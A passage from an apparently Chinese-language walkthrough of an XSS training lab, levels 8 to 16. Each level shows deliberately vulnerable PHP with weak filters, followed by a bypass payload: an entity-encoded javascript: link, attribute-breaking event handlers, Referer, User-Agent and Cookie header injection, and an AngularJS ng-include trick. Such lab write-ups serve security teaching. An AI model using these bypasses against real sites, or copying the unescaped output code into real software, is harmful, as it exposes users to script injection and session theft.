&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level9.php?keyword=not bad!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">    $str2 = str_replace(&quot;script&quot;, &quot;scr_ipt&quot;, $str);</span><br><span class="line">    $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span><br><span class="line">    $str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span><br><span class="line">    $str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span><br><span class="line">    $str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span><br><span class="line">    $str7 = str_replace(&#x27;&quot;&#x27;, &#x27;&amp;quot&#x27;, $str6);</span><br><span class="line">    </span><br><span class="line">    echo &#x27;&lt;center&gt;</span><br><span class="line">    &lt;form action=level8.php method=GET&gt;</span><br><span class="line">    &lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">    &lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>href属性的一个特性：href传入的URI中，也可以使用HTML字符实体。在打开链接时，字符实体会被转化为对应字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=javascrip&amp;#x74;:alert(1)</span><br></pre></td></tr></table></figure><p>发包之前要进行url编码。</p><h2 id="level9-必须包含http"><a href="#level9-必须包含http" class="headerlink" title="level9(必须包含http:&#x2F;&#x2F;)"></a>level9(必须包含http:&#x2F;&#x2F;)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level10.php?keyword=well done!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">    $str2 = str_replace(&quot;script&quot;, &quot;scr_ipt&quot;, $str);</span><br><span class="line">    $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span><br><span class="line">    $str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span><br><span class="line">    $str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span><br><span class="line">    $str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span><br><span class="line">    $str7 = str_replace(&#x27;&quot;&#x27;, &#x27;&amp;quot&#x27;, $str6);</span><br><span class="line">    </span><br><span class="line">    echo &#x27;&lt;center&gt;</span><br><span class="line">    &lt;form action=level9.php method=GET&gt;</span><br><span class="line">    &lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">    &lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    if(false === strpos($str7, &#x27;http://&#x27;)) &#123;</span><br><span class="line">        echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:<span class="title function_">alert</span>(<span class="string">&#x27;http://&#x27;</span>)</span><br><span class="line"></span><br><span class="line">javascrip&amp;#x74;:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><p>一定要进行url编码。</p><h2 id="level10-隐藏表单注入"><a href="#level10-隐藏表单注入" class="headerlink" title="level10(隐藏表单注入)"></a>level10(隐藏表单注入)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level11.php?keyword=good job!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">    $str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">    $str22 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str11);</span><br><span class="line">    $str33 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str22);</span><br><span class="line">    </span><br><span class="line">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">    &lt;form id=&quot;search&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level10.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>3个input标签里面，只有一个有回显，过滤了&lt; 和 &gt;。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)&quot; type=&quot;</span><br><span class="line">或</span><br><span class="line">&quot; onmouseover=&quot;alert(1)&quot; </span><br><span class="line">在客户端删除hidden也是可以的。</span><br></pre></td></tr></table></figure><h2 id="level11-Referer注入"><a href="#level11-Referer注入" class="headerlink" title="level11(Referer注入)"></a>level11(Referer注入)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level12.php?keyword=good job!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">    $str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">    $str11 = $_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">    $str22 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str11);</span><br><span class="line">    $str33 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str22);</span><br><span class="line">    </span><br><span class="line">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">    &lt;form id=&quot;search&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level11.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>referer注入：</p><img src="/XSS/XSS-Lab/image-20250723083928526.png" class="" title="image-20250723083928526"><h2 id="level12-User-Agent注入"><a href="#level12-User-Agent注入" class="headerlink" title="level12(User-Agent注入)"></a>level12(User-Agent注入)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            window.alert = function()  </span><br><span class="line">            &#123;     </span><br><span class="line">                confirm(&quot;完成的不错！&quot;);</span><br><span class="line">                window.location.href=&quot;level13.php?keyword=good job!&quot;; </span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">            $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">            $str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">            $str11=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">            $str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">            $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">            echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">            &lt;form id=search&gt;</span><br><span class="line">            &lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;/center&gt;&#x27;;</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>User_Agent头注入，过滤了&gt; &lt;。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot; onclick=alert(1) type=&quot;</span><br></pre></td></tr></table></figure><p>点击输入框即可。</p><img src="/XSS/XSS-Lab/image-20250723092547290.png" class="" title="image-20250723092547290"><h2 id="level13-Cookie注入"><a href="#level13-Cookie注入" class="headerlink" title="level13(Cookie注入)"></a>level13(Cookie注入)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            window.alert = function()  </span><br><span class="line">            &#123;     </span><br><span class="line">                confirm(&quot;完成的不错！&quot;);</span><br><span class="line">                window.location.href=&quot;level14.php&quot;; </span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">            ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">            $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">            $str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">            $str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">            $str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">            $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">            echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">            &lt;form id=search&gt;</span><br><span class="line">            &lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;/center&gt;&#x27;;</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>cookie注入，过滤了&lt; &gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&quot; onclick=alert(1) type=&quot;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS-Lab/image-20250723093315160.png" class="" title="image-20250723093315160"><h2 id="level15-Auglarjs的javascript框架漏洞"><a href="#level15-Auglarjs的javascript框架漏洞" class="headerlink" title="level15(Auglarjs的javascript框架漏洞)"></a>level15(Auglarjs的javascript框架漏洞)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#123;     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level15<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到第15关，自己想个办法走出去吧！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level15.png</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;?php </span></span></span><br><span class="line"><span class="meta"><span class="language-xml">        ini_set(&quot;display_errors&quot;, 0);</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">        $str = $_GET[&quot;src&quot;];</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">        echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>AngularJS 一般用于实现代码模块化，增加复杂页面代码的可读性。</p><p>angularJS的ng-include 用于包含外部的HTML文件，但是不会执行<code>&lt;script&gt;</code>里面的代码，ng-include可以作为一个属性，或者一个元素使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&#x27;level2.php?keyword=&quot; onclick=&quot;alert(1)&#x27;</span><br></pre></td></tr></table></figure><p>必须要用单引号括起来，点击输入框即可触发。</p><img src="/XSS/XSS-Lab/image-20250723095617125.png" class="" title="image-20250723095617125"><h2 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            window.alert = function()  </span><br><span class="line">            &#123;     </span><br><span class="line">                confirm(&quot;完成的不错！&quot;);</span><br><span class="line">                window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">            &#125;</span><br><span class="line">        